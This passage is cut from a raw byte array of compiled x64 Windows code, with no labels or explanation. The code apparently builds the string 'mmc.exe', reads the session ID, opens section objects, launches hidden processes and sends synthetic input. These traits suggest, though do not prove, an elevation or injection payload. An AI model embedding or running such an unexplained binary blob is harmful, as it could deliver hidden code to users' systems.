	0x44, 0x89, 0xB5, 0x88, 0x01, 0x00, 0x00, 0xC7, 0x85, 0x78, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
	0x00, 0xFF, 0x15, 0x39, 0x18, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x30, 0xBA, 0x08, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x3E, 0x19, 0x00, 0x00, 0x8B, 0xF8, 0x85, 0xC0, 0x78, 0x35,
	0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x8D, 0x85, 0x88, 0x01, 0x00, 0x00, 0x41, 0xB9, 0x04, 0x00,
	0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4C, 0x8D, 0x85, 0x78, 0x01, 0x00, 0x00, 0x41, 0x8D,
	0x51, 0x0E, 0xFF, 0x15, 0x60, 0x19, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x8B, 0xF8, 0xFF,
	0x15, 0x6B, 0x19, 0x00, 0x00, 0x85, 0xFF, 0x0F, 0x88, 0x76, 0xFF, 0xFF, 0xFF, 0x83, 0xBD, 0x78,
	0x01, 0x00, 0x00, 0x02, 0x0F, 0x85, 0x69, 0xFF, 0xFF, 0xFF, 0xE8, 0xE5, 0xFD, 0xFF, 0xFF, 0xCC,
	0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x38, 0xC7, 0x40, 0xE8, 0x6D, 0x00, 0x6D, 0x00, 0xC7, 0x40,
	0xEC, 0x63, 0x00, 0x2E, 0x00, 0xC7, 0x40, 0xF0, 0x65, 0x00, 0x78, 0x00, 0xC7, 0x40, 0xF4, 0x65,
	0x00, 0x00, 0x00, 0x83, 0xFA, 0x01, 0x75, 0x09, 0x4C, 0x8D, 0x40, 0xE8, 0xE8, 0x37, 0xFE, 0xFF,
	0xFF, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0x48, 0x83, 0xEC, 0x28,
	0xB8, 0x01, 0x00, 0x00, 0x00, 0x3B, 0xD0, 0x74, 0x05, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xE8, 0x91,
	0xFD, 0xFF, 0xFF, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x87, 0xFD, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC,
	0x48, 0x8B, 0xC4, 0x48, 0x81, 0xEC, 0x48, 0x04, 0x00, 0x00, 0xC7, 0x40, 0x08, 0x00, 0x00, 0x00,
	0x00, 0xFF, 0x15, 0x51, 0x17, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x4C, 0x8D, 0x44, 0x24, 0x30, 0x48,
	0x8D, 0x84, 0x24, 0x50, 0x04, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0xE8, 0x7F, 0xE6, 0xFF,
	0xFF, 0x85, 0xC0, 0x74, 0x14, 0x83, 0xBC, 0x24, 0x50, 0x04, 0x00, 0x00, 0x00, 0x76, 0x0A, 0x48,
	0x8D, 0x4C, 0x24, 0x30, 0xE8, 0x67, 0x0B, 0x00, 0x00, 0x33, 0xC9, 0xFF, 0x15, 0x07, 0x17, 0x00,
	0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x87, 0x0C, 0x00, 0x00, 0x33, 0xC9, 0xFF,
	0x15, 0xF3, 0x16, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83,
	0xEC, 0x20, 0x83, 0xFA, 0x01, 0x75, 0x74, 0xFF, 0x15, 0xD3, 0x16, 0x00, 0x00, 0x33, 0xC0, 0x48,
	0x8D, 0x3D, 0x6A, 0x56, 0x00, 0x00, 0xB9, 0x34, 0x08, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8D, 0x0D,
	0x5C, 0x56, 0x00, 0x00, 0xE8, 0x8B, 0xEA, 0xFF, 0xFF, 0x33, 0xDB, 0x8B, 0xF8, 0x85, 0xC0, 0x74,
	0x28, 0x66, 0x39, 0x1D, 0x54, 0x56, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x4D, 0x56, 0x00, 0x00, 0x48,
	0x8B, 0xC2, 0x74, 0x09, 0x48, 0x83, 0xC0, 0x02, 0x66, 0x39, 0x18, 0x75, 0xF7, 0x48, 0x2B, 0xC2,
	0x48, 0xD1, 0xF8, 0x44, 0x8D, 0x04, 0x00, 0xEB, 0x06, 0x48, 0x8B, 0xD3, 0x44, 0x8B, 0xC3, 0x48,
	0x8B, 0x0D, 0x5A, 0x16, 0x00, 0x00, 0xE8, 0x6D, 0xEF, 0xFF, 0xFF, 0x85, 0xFF, 0x74, 0x0C, 0x48,
	0x8D, 0x0D, 0x34, 0x5C, 0x00, 0x00, 0xE8, 0xE9, 0xEB, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x30,
	0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0x48, 0x89, 0x5C, 0x24,
	0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xF9, 0x83, 0xFA, 0x01, 0x75, 0x7D, 0x33, 0xD2,
	0x48, 0x8D, 0x0D, 0x25, 0xF6, 0xFF, 0xFF, 0xFF, 0x15, 0x3B, 0x17, 0x00, 0x00, 0x48, 0x8B, 0xCF,
	0xFF, 0x15, 0x52, 0x17, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8D, 0x3D, 0xC1, 0x55, 0x00, 0x00, 0xB9,
	0x34, 0x08, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8D, 0x0D, 0xB3, 0x55, 0x00, 0x00, 0xE8, 0xE2, 0xE9,
	0xFF, 0xFF, 0x33, 0xDB, 0x8B, 0xF8, 0x85, 0xC0, 0x74, 0x27, 0x66, 0x39, 0x1D, 0xAB, 0x55, 0x00,
	0x00, 0x48, 0x8D, 0x0D, 0xA4, 0x55, 0x00, 0x00, 0x48, 0x8B, 0xC1, 0x74, 0x09, 0x48, 0x83, 0xC0,
	0x02, 0x66, 0x39, 0x18, 0x75, 0xF7, 0x48, 0x2B, 0xC1, 0x48, 0xD1, 0xF8, 0x8D, 0x14, 0x00, 0xEB,
	0x05, 0x48, 0x8B, 0xCB, 0x8B, 0xD3, 0xE8, 0xC5, 0xF0, 0xFF, 0xFF, 0x85, 0xFF, 0x74, 0x0C, 0x48,
	0x8D, 0x0D, 0x94, 0x5B, 0x00, 0x00, 0xE8, 0x49, 0xEB, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x30,
	0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xB8, 0x01, 0x00, 0x00,
	0x00, 0xC3, 0xCC, 0xCC, 0x33, 0xC0, 0xC3, 0xCC, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C,
	0x24, 0x08, 0x55, 0x53, 0x56, 0x57, 0x48, 0x8D, 0x6C, 0x24, 0xC1, 0x48, 0x81, 0xEC, 0xD8, 0x00,
	0x00, 0x00, 0x33, 0xDB, 0x48, 0x8D, 0x0D, 0x45, 0x19, 0x00, 0x00, 0x48, 0x89, 0x5D, 0x77, 0x48,
	0x89, 0x5D, 0x7F, 0x48, 0x89, 0x5D, 0x67, 0xFF, 0x15, 0xDB, 0x15, 0x00, 0x00, 0x48, 0x8B, 0xF0,
	0x48, 0x85, 0xC0, 0x0F, 0x84, 0x21, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x00, 0x19, 0x00, 0x00,
	0xFF, 0x15, 0xC2, 0x15, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xF1, 0x00,
	0x00, 0x00, 0x48, 0x8D, 0x45, 0x77, 0x33, 0xD2, 0x4C, 0x8D, 0x0D, 0x61, 0x17, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x20, 0x44, 0x8D, 0x43, 0x01, 0x48, 0x8D, 0x0D, 0x61, 0x17, 0x00, 0x00, 0xFF,
	0x15, 0x2B, 0x17, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xC6, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4D,
	0x97, 0xFF, 0x15, 0x71, 0x15, 0x00, 0x00, 0x0F, 0x10, 0x4D, 0x97, 0x4C, 0x8D, 0x4D, 0xD7, 0x48,
	0x8B, 0x4D, 0x77, 0xF2, 0x0F, 0x10, 0x45, 0xA7, 0x4C, 0x8D, 0x45, 0xF7, 0x48, 0x8D, 0x55, 0x17,
	0x0F, 0x29, 0x4D, 0xB7, 0xF2, 0x0F, 0x11, 0x45, 0xC7, 0x48, 0x8B, 0x01, 0x0F, 0x29, 0x4D, 0xD7,
	0xF2, 0x0F, 0x11, 0x45, 0xE7, 0x0F, 0x29, 0x4D, 0xF7, 0x4C, 0x8B, 0x50, 0x50, 0x48, 0x8D, 0x45,
	0xB7, 0x48, 0x89, 0x44, 0x24, 0x20, 0xF2, 0x0F, 0x11, 0x45, 0x07, 0x0F, 0x29, 0x4D, 0x17, 0xF2,
	0x0F, 0x11, 0x45, 0x27, 0x41, 0xFF, 0xD2, 0x85, 0xC0, 0x78, 0x68, 0x48, 0x8B, 0x4D, 0x77, 0x4C,
	0x8D, 0x45, 0x7F, 0x48, 0x8B, 0xD6, 0x48, 0x8B, 0x01, 0x4C, 0x8B, 0x48, 0x38, 0x41, 0xFF, 0xD1,
	0x85, 0xC0, 0x78, 0x4F, 0x48, 0x8B, 0x4D, 0x7F, 0x4C, 0x8D, 0x45, 0x67, 0x48, 0x8B, 0xD7, 0x48,
	0x8B, 0x01, 0x4C, 0x8B, 0x48, 0x68, 0x41, 0xFF, 0xD1, 0x85, 0xC0, 0x78, 0x36, 0x48, 0x8B, 0x4D,
	0x67, 0x48, 0x8D, 0x55, 0x6F, 0x48, 0x8B, 0x01, 0x4C, 0x8B, 0x40, 0x48, 0x41, 0xFF, 0xD0, 0x85,
	0xC0, 0x78, 0x20, 0x83, 0x7D, 0x6F, 0x04, 0x75, 0x13, 0x48, 0x8B, 0x4D, 0x67, 0x33, 0xD2, 0x48,
	0x8B, 0x01, 0x4C, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xD0, 0x8B, 0xD8, 0xF7, 0xD3,
	0xC1, 0xEB, 0x1F, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0xB4, 0x14, 0x00, 0x00, 0x48, 0x85, 0xFF, 0x74,
	0x09, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xA6, 0x14, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x67, 0x48, 0x85,
	0xC9, 0x74, 0x09, 0x48, 0x8B, 0x01, 0x48, 0x8B, 0x50, 0x10, 0xFF, 0xD2, 0x48, 0x8B, 0x4D, 0x7F,
	0x48, 0x85, 0xC9, 0x74, 0x09, 0x48, 0x8B, 0x01, 0x48, 0x8B, 0x50, 0x10, 0xFF, 0xD2, 0x48, 0x8B,
	0x4D, 0x77, 0x48, 0x85, 0xC9, 0x74, 0x0A, 0x48, 0x8B, 0x11, 0x4C, 0x8B, 0x42, 0x10, 0x41, 0xFF,
	0xD0, 0x8B, 0xC3, 0x48, 0x81, 0xC4, 0xD8, 0x00, 0x00, 0x00, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0xCC,
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x70, 0x33, 0xDB, 0xC7,
	0x45, 0xB0, 0x71, 0x4E, 0xF5, 0xEE, 0x48, 0x8D, 0x0D, 0xFB, 0x17, 0x00, 0x00, 0xC7, 0x45, 0xB4,
	0x61, 0x06, 0x2D, 0x42, 0x48, 0x89, 0x4D, 0xD0, 0x4C, 0x8D, 0x4D, 0xD0, 0x48, 0x89, 0x4D, 0xE0,
	0x48, 0x8D, 0x55, 0xC0, 0x48, 0xB8, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0xC7, 0x45,
	0xB8, 0x9A, 0x98, 0x82, 0xFD, 0x44, 0x8D, 0x43, 0x03, 0xC7, 0x45, 0xBC, 0x49, 0x40, 0xB8, 0x20,
	0x48, 0x8D, 0x4D, 0xB0, 0x48, 0xC7, 0x45, 0xD8, 0x04, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x45, 0xE8,
	0x04, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5D, 0xF0, 0x48, 0x89, 0x5D, 0xF8, 0xC7, 0x45, 0xC0, 0x46,
	0x1F, 0x00, 0x11, 0xC7, 0x45, 0xC4, 0x04, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0xC8, 0xFF, 0x15,
	0x9C, 0x14, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x1F, 0xB8, 0x48, 0x1F, 0x00, 0x00, 0x4C, 0x8D, 0x4D,
	0xD0, 0x44, 0x8D, 0x43, 0x03, 0x66, 0x89, 0x45, 0xC0, 0x48, 0x8D, 0x55, 0xC0, 0x48, 0x8D, 0x4D,
	0xB0, 0xFF, 0x15, 0x79, 0x14, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48,
	0x83, 0xC4, 0x70, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0xBA, 0x0E,
	0x00, 0x00, 0x00, 0x33, 0xC9, 0xBB, 0x01, 0x00, 0x00, 0xC0, 0xFF, 0x15, 0x40, 0x15, 0x00, 0x00,
	0x85, 0xC0, 0x78, 0x29, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x80, 0x69,
	0x67, 0xFF, 0x33, 0xC9, 0xFF, 0x15, 0xA6, 0x14, 0x00, 0x00, 0xE8, 0x69, 0xFD, 0xFF, 0xFF, 0xF7,
	0xD8, 0x1B, 0xC9, 0xF7, 0xD1, 0x23, 0xD9, 0xFF, 0x15, 0x0B, 0x15, 0x00, 0x00, 0x8B, 0xC3, 0x48,
	0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x54, 0x24,
	0x30, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0xD3, 0xCE, 0xFE, 0x33, 0xC9, 0xFF, 0x15, 0x6E, 0x14,
	0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48,
	0x89, 0x58, 0x10, 0x57, 0x48, 0x81, 0xEC, 0x40, 0x02, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x58, 0x08,
	0xFF, 0x15, 0xD2, 0x12, 0x00, 0x00, 0x48, 0x8D, 0x7C, 0x24, 0x30, 0xB9, 0x0A, 0x02, 0x00, 0x00,
	0x48, 0x8B, 0xD0, 0x4C, 0x8D, 0x44, 0x24, 0x30, 0x33, 0xC0, 0xF3, 0xAA, 0x48, 0x8D, 0x84, 0x24,
	0x50, 0x02, 0x00, 0x00, 0x48, 0x8B, 0xCA, 0x48, 0x89, 0x44, 0x24, 0x20, 0xE8, 0xEF, 0xE1, 0xFF,
	0xFF, 0x39, 0x9C, 0x24, 0x50, 0x02, 0x00, 0x00, 0x74, 0x2C, 0x0F, 0xB7, 0x44, 0x24, 0x30, 0x66,
	0x83, 0xF8, 0x31, 0x75, 0x07, 0xE8, 0x76, 0xFE, 0xFF, 0xFF, 0xEB, 0x18, 0x66, 0x83, 0xF8, 0x32,
	0x75, 0x07, 0xE8, 0x21, 0xFF, 0xFF, 0xFF, 0xEB, 0x0B, 0x66, 0x83, 0xF8, 0x33, 0x75, 0x07, 0xE8,
	0x64, 0xFF, 0xFF, 0xFF, 0x8B, 0xD8, 0x8B, 0xCB, 0xFF, 0x15, 0x5A, 0x12, 0x00, 0x00, 0xCC, 0xCC,
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x18, 0x55, 0x57, 0x41, 0x56, 0x48, 0x8D,
	0xAC, 0x24, 0x90, 0xFA, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0x70, 0x06, 0x00, 0x00, 0x45, 0x33, 0xF6,
	0xBB, 0x00, 0x10, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x58, 0x4C, 0x89, 0xB5, 0xA8, 0x05, 0x00,
	0x00, 0x48, 0x89, 0x5C, 0x24, 0x60, 0x4C, 0x89, 0x74, 0x24, 0x50, 0x83, 0xFA, 0x01, 0x0F, 0x85,
	0x61, 0x03, 0x00, 0x00, 0xFF, 0x15, 0x06, 0x12, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8D, 0x7D, 0x50,
	0xBE, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x50, 0x8B, 0xCE, 0xF3, 0xAA, 0xB9, 0x66, 0x30,
	0x00, 0x00, 0xE8, 0xA1, 0xE3, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0xD2, 0x15, 0x00, 0x00, 0x48, 0x8D,
	0x8D, 0x50, 0x01, 0x00, 0x00, 0xE8, 0x5A, 0xF7, 0xFF, 0xFF, 0x48, 0x8D, 0x95, 0x50, 0x01, 0x00,
	0x00, 0x66, 0x44, 0x39, 0xB5, 0x50, 0x01, 0x00, 0x00, 0x74, 0x0A, 0x48, 0x83, 0xC2, 0x02, 0x66,
	0x44, 0x39, 0x32, 0x75, 0xF6, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x48, 0x60, 0x8B, 0x89, 0xC0, 0x02, 0x00, 0x00, 0xE8, 0xE3, 0xE1, 0xFF, 0xFF, 0x48, 0x8D, 0x15,
	0xDC, 0x13, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x50, 0x01, 0x00, 0x00, 0xE8, 0x68, 0xF6, 0xFF, 0xFF,
	0x48, 0x8D, 0x55, 0x50, 0x48, 0x8D, 0x8D, 0x50, 0x01, 0x00, 0x00, 0xE8, 0x58, 0xF6, 0xFF, 0xFF,
	0x48, 0x8D, 0x95, 0x50, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x68, 0xFF, 0x15, 0xEE, 0x12,
	0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x68, 0xC7, 0x44, 0x24, 0x78, 0x30, 0x00, 0x00, 0x00, 0x0F,
	0x57, 0xC0, 0x48, 0x89, 0x45, 0x88, 0x4C, 0x8D, 0x44, 0x24, 0x78, 0x4C, 0x89, 0x75, 0x80, 0xBA,
	0x1F, 0x00, 0x0F, 0x00, 0xC7, 0x45, 0x90, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x58,
	0xF3, 0x0F, 0x7F, 0x45, 0x98, 0xFF, 0x15, 0x25, 0x13, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0x82,
	0x02, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48, 0x8D, 0x44, 0x24, 0x60, 0xC7, 0x44, 0x24,
	0x48, 0x04, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x85, 0xA8, 0x05, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x40,
	0x00, 0x00, 0x10, 0x00, 0x45, 0x33, 0xC9, 0xC7, 0x44, 0x24, 0x38, 0x02, 0x00, 0x00, 0x00, 0x48,
	0x83, 0xCA, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4C, 0x89, 0x74, 0x24, 0x28, 0x48, 0x89, 0x5C,
	0x24, 0x20, 0xFF, 0x15, 0x18, 0x12, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0x2A, 0x02, 0x00, 0x00,
	0x4C, 0x8B, 0x85, 0xA8, 0x05, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0x1A, 0x02, 0x00, 0x00,
	0x48, 0x81, 0x7C, 0x24, 0x60, 0x10, 0x02, 0x00, 0x00, 0x0F, 0x82, 0x0B, 0x02, 0x00, 0x00, 0x33,
	0xC0, 0x48, 0x8D, 0xBD, 0x60, 0x03, 0x00, 0x00, 0xB9, 0x0A, 0x02, 0x00, 0x00, 0x49, 0x83, 0xC0,
	0x04, 0xF3, 0xAA, 0x48, 0x8D, 0x8D, 0x60, 0x03, 0x00, 0x00, 0xE8, 0x85, 0xF6, 0xFF, 0xFF, 0x33,
	0xC0, 0x48, 0x8D, 0x7D, 0x50, 0x48, 0x8B, 0xCE, 0x48, 0x8D, 0x15, 0xD1, 0x12, 0x00, 0x00, 0xF3,
	0xAA, 0x48, 0x8D, 0x8D, 0x50, 0x01, 0x00, 0x00, 0xE8, 0x07, 0xF6, 0xFF, 0xFF, 0x48, 0x8D, 0x55,
	0x50, 0xB9, 0x66, 0x31, 0x00, 0x00, 0xE8, 0x2D, 0xE2, 0xFF, 0xFF, 0x48, 0x8D, 0x55, 0x50, 0x48,
	0x8D, 0x8D, 0x50, 0x01, 0x00, 0x00, 0xE8, 0x3D, 0xF5, 0xFF, 0xFF, 0x48, 0x8D, 0x95, 0x50, 0x01,
	0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x68, 0xFF, 0x15, 0xD3, 0x11, 0x00, 0x00, 0x48, 0x8D, 0x44,
	0x24, 0x68, 0xC7, 0x44, 0x24, 0x78, 0x30, 0x00, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x48, 0x89, 0x45,
	0x88, 0x4C, 0x8D, 0x44, 0x24, 0x78, 0x4C, 0x89, 0x75, 0x80, 0xBA, 0x02, 0x00, 0x00, 0x00, 0xC7,
	0x45, 0x90, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xF3, 0x0F, 0x7F, 0x45, 0x98,
	0xFF, 0x15, 0x7A, 0x11, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0x4B, 0x01, 0x00, 0x00, 0x33, 0xC0,
	0x48, 0x8D, 0x3D, 0xA9, 0x4F, 0x00, 0x00, 0xB9, 0x34, 0x08, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8D,
	0x0D, 0x9B, 0x4F, 0x00, 0x00, 0xE8, 0xCA, 0xE3, 0xFF, 0xFF, 0x8B, 0xF0, 0x85, 0xC0, 0x74, 0x29,
	0x66, 0x44, 0x39, 0x35, 0x94, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x3D, 0x8D, 0x4F, 0x00, 0x00, 0x48,
	0x8B, 0xCF, 0x74, 0x0A, 0x48, 0x83, 0xC1, 0x02, 0x66, 0x44, 0x39, 0x31, 0x75, 0xF6, 0x48, 0x2B,
	0xCF, 0x48, 0xD1, 0xF9, 0x8D, 0x1C, 0x09, 0xEB, 0x06, 0x49, 0x8B, 0xFE, 0x41, 0x8B, 0xDE, 0x48,
	0x8D, 0x15, 0xC2, 0x13, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xB8, 0xFF, 0x15, 0x58, 0x11, 0x00, 0x00,
	0x85, 0xC0, 0x78, 0x23, 0xBA, 0x30, 0x00, 0xFE, 0x7F, 0x48, 0x8D, 0x4D, 0xA8, 0xFF, 0x15, 0x45,
	0x11, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x10, 0x4C, 0x8D, 0x45, 0xA8, 0x33, 0xC9, 0x48, 0x8D, 0x55,
	0xB8, 0xFF, 0x15, 0x41, 0x11, 0x00, 0x00, 0x8B, 0xD3, 0x48, 0x8B, 0xCF, 0xE8, 0x83, 0xE6, 0xFF,
	0xFF, 0x85, 0xC0, 0x74, 0x0D, 0x48, 0x8B, 0x85, 0xA8, 0x05, 0x00, 0x00, 0xC7, 0x00, 0x01, 0x00,
	0x00, 0x00, 0x33, 0xC0, 0xC7, 0x85, 0x98, 0x05, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0x48, 0x8D,
	0x7D, 0xE0, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x8D, 0x50, 0x68, 0x8B, 0xCA, 0xF3, 0xAA, 0x48,
	0x8D, 0x45, 0xC8, 0x89, 0x55, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8D, 0x95, 0x98, 0x05,
	0x00, 0x00, 0x48, 0x8D, 0x45, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8D, 0x8D, 0x60, 0x03,
	0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x38, 0x4C, 0x89, 0x74, 0x24, 0x30, 0xC7, 0x44, 0x24, 0x28,
	0x00, 0x00, 0x00, 0x08, 0x44, 0x89, 0x74, 0x24, 0x20, 0xFF, 0x15, 0xF1, 0x0E, 0x00, 0x00, 0x85,
	0xC0, 0x74, 0x1E, 0x48, 0x8B, 0x4D, 0xD0, 0xFF, 0x15, 0xBB, 0x0E, 0x00, 0x00, 0x48, 0x8B, 0x4D,
	0xC8, 0xFF, 0x15, 0xB1, 0x0E, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xA8, 0x05, 0x00, 0x00, 0x83, 0x08,
	0x02, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x33, 0xD2, 0xFF, 0x15, 0xAA, 0x10, 0x00, 0x00, 0x48, 0x8B,
	0x4C, 0x24, 0x50, 0xFF, 0x15, 0x77, 0x10, 0x00, 0x00, 0x85, 0xF6, 0x74, 0x0C, 0x48, 0x8D, 0x0D,
	0x96, 0x54, 0x00, 0x00, 0xE8, 0x4B, 0xE4, 0xFF, 0xFF, 0x48, 0x8B, 0x95, 0xA8, 0x05, 0x00, 0x00,
	0x48, 0x83, 0xC9, 0xFF, 0xFF, 0x15, 0x8E, 0x10, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0xFF,
	0x15, 0x4B, 0x10, 0x00, 0x00, 0x4C, 0x8D, 0x9C, 0x24, 0x70, 0x06, 0x00, 0x00, 0xB8, 0x01, 0x00,
	0x00, 0x00, 0x49, 0x8B, 0x5B, 0x20, 0x49, 0x8B, 0x73, 0x30, 0x49, 0x8B, 0xE3, 0x41, 0x5E, 0x5F,
	0x5D, 0xC3, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89,
	0x7C, 0x24, 0x18, 0x55, 0x41, 0x54, 0x41, 0x56, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x50, 0x33,
	0xF6, 0x41, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0x75, 0xD0, 0x8B, 0xDA, 0x66, 0x89, 0x75,
	0xDA, 0x0F, 0xB7, 0xF9, 0x48, 0x89, 0x75, 0xDC, 0x41, 0xBC, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x75, 0xE8, 0x85, 0xD2, 0x74, 0x16, 0x45, 0x8D, 0x46, 0x27, 0x66, 0x44, 0x89, 0x65, 0xD8, 0x48,
	0x8D, 0x55, 0xD0, 0x41, 0x8B, 0xCE, 0xFF, 0x15, 0x44, 0x0F, 0x00, 0x00, 0x41, 0xB8, 0x28, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x7D, 0xD8, 0x48, 0x8D, 0x55, 0xD0, 0x41, 0x8B, 0xCE, 0xFF, 0x15, 0x2D,
	0x0F, 0x00, 0x00, 0xBF, 0x02, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x55, 0xD0, 0x41, 0x8B, 0xCE, 0x89,
	0x7D, 0xDC, 0x44, 0x8D, 0x47, 0x26, 0xFF, 0x15, 0x14, 0x0F, 0x00, 0x00, 0x85, 0xDB, 0x74, 0x19,
	0x44, 0x8D, 0x47, 0x26, 0x66, 0x44, 0x89, 0x65, 0xD8, 0x48, 0x8D, 0x55, 0xD0, 0x89, 0x7D, 0xDC,
	0x41, 0x8B, 0xCE, 0xFF, 0x15, 0xF7, 0x0E, 0x00, 0x00, 0x4C, 0x8D, 0x5C, 0x24, 0x50, 0x49, 0x8B,
	0x5B, 0x20, 0x49, 0x8B, 0x73, 0x28, 0x49, 0x8B, 0x7B, 0x30, 0x49, 0x8B, 0xE3, 0x41, 0x5E, 0x41,
	0x5C, 0x5D, 0xC3, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x56, 0x57, 0x48, 0x81, 0xEC, 0x30,
	0x02, 0x00, 0x00, 0x48, 0x8B, 0xDA, 0x4C, 0x8D, 0x0D, 0x0B, 0x12, 0x00, 0x00, 0x33, 0xD2, 0x4C,
	0x8D, 0x05, 0x12, 0x12, 0x00, 0x00, 0x48, 0x8B, 0xF1, 0xFF, 0x15, 0x61, 0x0E, 0x00, 0x00, 0x33,
	0xED, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x5F, 0x01, 0x00, 0x00, 0x8D, 0x7D, 0x0E, 0xB9, 0x28, 0x00,
	0x00, 0x00, 0x33, 0xD2, 0xE8, 0xFB, 0xFE, 0xFF, 0xFF, 0x48, 0x83, 0xEF, 0x01, 0x75, 0xEE, 0xBA,
